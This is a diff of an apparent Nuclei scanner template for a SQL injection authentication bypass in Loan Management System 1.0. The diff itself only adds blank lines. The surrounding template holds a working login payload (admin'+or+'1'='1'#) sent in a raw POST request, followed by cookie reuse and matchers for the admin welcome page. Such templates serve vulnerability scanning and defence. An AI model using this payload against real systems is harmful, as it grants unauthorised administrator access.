@@ -1,4 +1,5 @@
 id: loancms-sqli
+
 info:
   name: Loan Management System 1.0 - SQLi Authentication Bypass
   author: arafatansari
@@ -10,6 +11,7 @@ info:
   metadata:
     verified: true
   tags: loancms,sqli,auth-bypass,cms
+
 requests:
   - raw:
       - |
@@ -18,9 +20,11 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         username=admin'+or+'1'%3D'1'%23&password=nuclei
+
       - |
         GET /index.php?page=home HTTP/1.1
         Host: {{Hostname}}
+
     cookie-reuse: true
     matchers-condition: and
     matchers:
@@ -31,6 +35,7 @@ requests:
           - 'Welcome back Admin'
           - 'Loan Management System'
         condition: and
+
       - type: word
         part: body
         words:
